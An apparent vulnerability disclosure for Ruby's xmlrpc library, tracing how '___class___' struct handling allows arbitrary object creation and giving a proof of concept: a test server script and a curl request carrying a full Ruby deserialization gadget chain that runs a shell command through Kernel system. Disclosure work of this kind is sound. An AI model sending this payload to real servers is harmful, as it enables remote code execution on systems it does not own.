Hello,

XMLRPC is vulnerable to unsafe deserilization of untrusted data leading to remote code execution when  `Config::ENABLE_MARSHALLING` is set to true.<br>
Although the check for `XMLRPC::Marshallable` is supposed to help control which classes can be serialized it is performed too late the execution has already happened by that point
Below are the full details<br>
Going through XMLRPC source code we can follow the data as it gets processed.<br>
the method `process` calls `parseMethodCall` on the provided data then returns a list with `method_name` and params passed to the rpc
https://github.com/ruby/xmlrpc/blob/5cc6a7e00a9a468bb72375ecd78b086708eb2bb9/lib/xmlrpc/server.rb#L284

```
def process(data)
    method, params = parser().parseMethodCall(data)
    handle(method, *params)
end
```


https://github.com/ruby/xmlrpc/blob/5cc6a7e00a9a468bb72375ecd78b086708eb2bb9/lib/xmlrpc/parser.rb#L464
```
def parseMethodCall(str)
   parser = @parser_class.new
   parser.parse(str)
   raise "No valid method call - missing method name!" if parser.method_name.nil?
   [parser.method_name, parser.params]
end
```


Looking into `params` method we can see that it parses the node `<params>` from the xml iterating through each `<param>` node and calling the method `param` on it
https://github.com/ruby/xmlrpc/blob/5cc6a7e00a9a468bb72375ecd78b086708eb2bb9/lib/xmlrpc/parser.rb#L350
```
def params(node, call=true)
        nodeMustBe(node, "params")

        if call
          node.childNodes.to_a.collect do |n|
            param(n)
          end
        else # response (only one param)
          hasOnlyOneChild(node)
          param(node.firstChild)
        end
end
```
  
https://github.com/ruby/xmlrpc/blob/5cc6a7e00a9a468bb72375ecd78b086708eb2bb9/lib/xmlrpc/parser.rb#L322
```
def param(node)
        nodeMustBe(node, "param")
        hasOnlyOneChild(node, "value")
        value(node.firstChild)
end
```
Moving forward we can see the method `value` being called which will try to set the type and convert the data based on the node when the element is of type struct the method struct is called on the node 

https://github.com/ruby/xmlrpc/blob/5cc6a7e00a9a468bb72375ecd78b086708eb2bb9/lib/xmlrpc/parser.rb#L394
```
def value(node)
      ...
        when :ELEMENT
          case child.nodeName
      ...
          when "struct"           then struct(child)
          when "array"            then array(child)
      ...
 end
```
  
https://github.com/ruby/xmlrpc/blob/5cc6a7e00a9a468bb72375ecd78b086708eb2bb9/lib/xmlrpc/parser.rb#L107
```
 def self.struct(hash)
      # convert to marshalled object
      klass = hash["___class___"]
      if klass.nil? or Config::ENABLE_MARSHALLING == false  # Check if
        hash
      else
        begin
          mod = Module
          klass.split("::").each {|const| mod = mod.const_get(const.strip)}

          obj = mod.allocate

          hash.delete "___class___"
          hash.each {|key, value|
            obj.instance_variable_set("@#{ key }", value) if key =~ /^([a-zA-Z_]\w*)$/
          }
          obj
        rescue
          hash
        end
      end
    end
 ```
 
The above method will check if ENABLE_MARSHELLING is set to true, this is by default is true as we can see under [config.rb](https://github.com/ruby/xmlrpc/blob/5cc6a7e00a9a468bb72375ecd78b086708eb2bb9/lib/xmlrpc/config.rb#L28) 
<br>XMLRPC support `___class___`  when struct is called on a node it will essentially create a new instance of the class and sets it's instance variables if there are any in the node as we can see the code above

<br>Now using a universal gadget chain we can achieve remote code execution, you can find detailed article about the gadget used [here](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)

### Proof of concept
Save the following as rpc.rb 
```
require 'xmlrpc/server'
require 'xmlrpc/marshal'
require 'webrick'

class MyXMLRPCServlet < WEBrick::HTTPServlet::AbstractServlet
  def initialize(server)
    @xmlrpc_server = XMLRPC::BasicServer.new
    @xmlrpc_server.add_handler('greeting') do |firstname|
      puts firstname
    end
  end

  def do_POST(req, res)
    content = @xmlrpc_server.process(req.body)
    res.status = 200
    res['Content-Type'] = 'text/xml; charset=utf-8'
    res.body = content
  end
end
server = WEBrick::HTTPServer.new(
  Port: 8080
)
server.mount('/RPC2', MyXMLRPCServlet)
trap('INT') { server.shutdown }
puts "Starting XML-RPC server on 0.0.0.0:8080..."
server.start
```

Start the server and Send the following curl request 
```
curl -i -s -k -X 'POST' --data-binary '<?xml version=\"1.0\" ?><methodCall><methodName>greeting</methodName><params><param><value><array><data><value><struct><member><name>___class___</name><value><string>Gem::Installer</string></value></member><member><name>i</name><value><string>x</string></value></member></struct></value><value><struct><member><name>___class___</name><value><string>Gem::SpecFetcher</string></value></member><member><name>i</name><value><string>y</string></value></member></struct></value><value><struct><member><name>___class___</name><value><string>Gem::Requirement</string></value></member><member><name>requirements</name><value><struct><member><name>___class___</name><value><string>Gem::Package::TarReader</string></value></member><member><name>io</name><value><struct><member><name>___class___</name><value><string>Net::BufferedIO</string></value></member><member><name>io</name><value><struct><member><name>___class___</name><value><string>Gem::Package::TarReader::Entry</string></value></member><member><name>read</name><value><i4>0</i4></value></member><member><name>header</name><value><string>abc</string></value></member></struct></value></member><member><name>debug_output</name><value><struct><member><name>___class___</name><value><string>Net::WriteAdapter</string></value></member><member><name>socket</name><value><struct><member><name>___class___</name><value><string>Gem::RequestSet</string></value></member><member><name>sets</name><value><struct><member><name>___class___</name><value><string>Net::WriteAdapter</string></value></member><member><name>socket</name><value><string>Kernel</string></value></member><member><name>method_id</name><value><string>system</string></value></member></struct></value></member><member><name>git_set</name><value><string>id >/tmp/xmlrpc.txt</string></value></member></struct></value></member><member><name>method_id</name><value><string>resolve</string></value></member></struct></value></member></struct></value></member><member><name>method_id</name><value><string>resolve</string></value></member></struct></value></member></struct></value></data></array></value></param></params></methodCall>' 'http://localhost:8080/RPC2'
```
Check for the file created under /tmp/xmlrpc.txt 
